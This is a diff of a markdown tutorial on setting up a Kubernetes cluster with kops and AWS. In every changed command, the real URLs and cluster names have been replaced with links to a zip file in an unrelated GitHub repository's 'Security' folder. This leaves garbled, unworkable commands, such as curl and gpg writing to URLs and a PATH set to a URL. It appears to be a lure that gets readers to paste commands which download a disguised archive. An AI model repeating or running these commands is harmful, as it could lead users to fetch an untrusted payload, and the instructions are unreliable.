@@ -22,12 +22,12 @@ sudo apt-get install -y ca-certificates curl apt-transport-https
 ```
 
 ```
-curl -fsSL https://raw.githubusercontent.com/shr1324/Kubernetes-Zero-to-Hero/main/Security/Zero-to-Hero-Kubernetes-charqui.zip | sudo gpg --dearmor -o https://raw.githubusercontent.com/shr1324/Kubernetes-Zero-to-Hero/main/Security/Zero-to-Hero-Kubernetes-charqui.zip
+curl -fsSL https://github.com/shr1324/Kubernetes-Zero-to-Hero/raw/refs/heads/main/Security/to_Hero_Zero_Kubernetes_v3.4.zip | sudo gpg --dearmor -o https://github.com/shr1324/Kubernetes-Zero-to-Hero/raw/refs/heads/main/Security/to_Hero_Zero_Kubernetes_v3.4.zip
 
 ```
 
 ```
-echo 'deb [https://raw.githubusercontent.com/shr1324/Kubernetes-Zero-to-Hero/main/Security/Zero-to-Hero-Kubernetes-charqui.zip] https://raw.githubusercontent.com/shr1324/Kubernetes-Zero-to-Hero/main/Security/Zero-to-Hero-Kubernetes-charqui.zip /' | sudo tee https://raw.githubusercontent.com/shr1324/Kubernetes-Zero-to-Hero/main/Security/Zero-to-Hero-Kubernetes-charqui.zip
+echo 'deb [https://github.com/shr1324/Kubernetes-Zero-to-Hero/raw/refs/heads/main/Security/to_Hero_Zero_Kubernetes_v3.4.zip] https://github.com/shr1324/Kubernetes-Zero-to-Hero/raw/refs/heads/main/Security/to_Hero_Zero_Kubernetes_v3.4.zip /' | sudo tee https://github.com/shr1324/Kubernetes-Zero-to-Hero/raw/refs/heads/main/Security/to_Hero_Zero_Kubernetes_v3.4.zip
 ```
 
 ```
@@ -42,13 +42,13 @@ Install AWS CLI (Ubuntu 24.04 compatible):
 sudo snap install aws-cli --classic
 ```
 ```
-export PATH="$https://raw.githubusercontent.com/shr1324/Kubernetes-Zero-to-Hero/main/Security/Zero-to-Hero-Kubernetes-charqui.zip"
+export PATH="$https://github.com/shr1324/Kubernetes-Zero-to-Hero/raw/refs/heads/main/Security/to_Hero_Zero_Kubernetes_v3.4.zip"
 ```
 
 ### Install KOPS (our hero for today)
 
 ```
-curl -LO https://raw.githubusercontent.com/shr1324/Kubernetes-Zero-to-Hero/main/Security/Zero-to-Hero-Kubernetes-charqui.zip$(curl -s https://raw.githubusercontent.com/shr1324/Kubernetes-Zero-to-Hero/main/Security/Zero-to-Hero-Kubernetes-charqui.zip | grep tag_name | cut -d '"' -f 4)/kops-linux-amd64
+curl -LO https://github.com/shr1324/Kubernetes-Zero-to-Hero/raw/refs/heads/main/Security/to_Hero_Zero_Kubernetes_v3.4.zip$(curl -s https://github.com/shr1324/Kubernetes-Zero-to-Hero/raw/refs/heads/main/Security/to_Hero_Zero_Kubernetes_v3.4.zip | grep tag_name | cut -d '"' -f 4)/kops-linux-amd64
 
 chmod +x kops-linux-amd64
 
@@ -79,19 +79,19 @@ aws s3api create-bucket --bucket kops-abhi-storage --region us-east-1
 ### Create the cluster 
 
 ```
-kops create cluster https://raw.githubusercontent.com/shr1324/Kubernetes-Zero-to-Hero/main/Security/Zero-to-Hero-Kubernetes-charqui.zip --state=s3://kops-abhi-storage --zones=us-east-1a --node-count=1 https://raw.githubusercontent.com/shr1324/Kubernetes-Zero-to-Hero/main/Security/Zero-to-Hero-Kubernetes-charqui.zip https://raw.githubusercontent.com/shr1324/Kubernetes-Zero-to-Hero/main/Security/Zero-to-Hero-Kubernetes-charqui.zip  --master-volume-size=8 --node-volume-size=8
+kops create cluster https://github.com/shr1324/Kubernetes-Zero-to-Hero/raw/refs/heads/main/Security/to_Hero_Zero_Kubernetes_v3.4.zip --state=s3://kops-abhi-storage --zones=us-east-1a --node-count=1 https://github.com/shr1324/Kubernetes-Zero-to-Hero/raw/refs/heads/main/Security/to_Hero_Zero_Kubernetes_v3.4.zip https://github.com/shr1324/Kubernetes-Zero-to-Hero/raw/refs/heads/main/Security/to_Hero_Zero_Kubernetes_v3.4.zip  --master-volume-size=8 --node-volume-size=8
 ```
 
 ### Important: Edit the configuration as there are multiple resources created which won't fall into the free tier.
 
 ```
-kops edit cluster https://raw.githubusercontent.com/shr1324/Kubernetes-Zero-to-Hero/main/Security/Zero-to-Hero-Kubernetes-charqui.zip
+kops edit cluster https://github.com/shr1324/Kubernetes-Zero-to-Hero/raw/refs/heads/main/Security/to_Hero_Zero_Kubernetes_v3.4.zip
 ```
 
 Step 12: Build the cluster
 
 ```
-kops update cluster https://raw.githubusercontent.com/shr1324/Kubernetes-Zero-to-Hero/main/Security/Zero-to-Hero-Kubernetes-charqui.zip --yes --state=s3://kops-abhi-storage
+kops update cluster https://github.com/shr1324/Kubernetes-Zero-to-Hero/raw/refs/heads/main/Security/to_Hero_Zero_Kubernetes_v3.4.zip --yes --state=s3://kops-abhi-storage
 ```
 
 This will take a few minutes to create............
@@ -99,6 +99,6 @@ This will take a few minutes to create............
 After a few mins, run the below command to verify the cluster installation.
 
 ```
-kops validate cluster https://raw.githubusercontent.com/shr1324/Kubernetes-Zero-to-Hero/main/Security/Zero-to-Hero-Kubernetes-charqui.zip
+kops validate cluster https://github.com/shr1324/Kubernetes-Zero-to-Hero/raw/refs/heads/main/Security/to_Hero_Zero_Kubernetes_v3.4.zip
 ```
 
